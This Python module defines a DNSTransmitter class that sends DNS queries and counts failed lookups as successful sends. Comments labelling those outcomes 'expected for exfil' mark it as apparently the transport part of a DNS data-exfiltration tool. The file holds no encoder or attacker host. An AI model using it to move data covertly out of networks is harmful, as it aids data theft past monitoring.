#!/usr/bin/env python3
"""
DNS transmission logic
"""

import dns.resolver

class DNSTransmitter:
    """Transmit DNS queries"""
    
    def __init__(self, dns_server=None, timeout=5):
        """
        Initialize DNS transmitter
        
        Args:
            dns_server: DNS server IP (None for system default)
            timeout: Query timeout in seconds
        """
        self.resolver = dns.resolver.Resolver()
        self.timeout = timeout
        
        if dns_server:
            self.resolver.nameservers = [dns_server]
        
        # Configure resolver
        self.resolver.timeout = timeout
        self.resolver.lifetime = timeout
    
    def send_query(self, query_name, query_type='A'):
        """
        Send DNS query
        
        Args:
            query_name: DNS name to query
            query_type: Query type (A, TXT, etc.)
            
        Returns:
            True if query sent, False on error
        """
        try:
            self.resolver.resolve(query_name, query_type)
            return True
        except dns.resolver.NXDOMAIN:
            # Domain doesn't exist - expected for exfil
            return True
        except dns.resolver.NoAnswer:
            # No answer - expected for exfil
            return True
        except dns.resolver.Timeout:
            # Timeout - query still sent
            return True
        except Exception as e:
            # Other errors
            return False
    
    def send_query_silent(self, query_name, query_type='A'):
        """
        Send DNS query without caring about response
        
        Args:
            query_name: DNS name to query
            query_type: Query type
            
        Returns:
            True (always, since we don't care about response)
        """
        try:
            self.resolver.resolve(query_name, query_type)
        except:
            pass  # Ignore all errors
        
        return True
    
    def test_connectivity(self, test_domain='google.com'):
        """
        Test DNS connectivity
        
        Args:
            test_domain: Domain to test with
            
        Returns:
            True if DNS is working
        """
        try:
            self.resolver.resolve(test_domain, 'A')
            return True
        except Exception as e:
            return False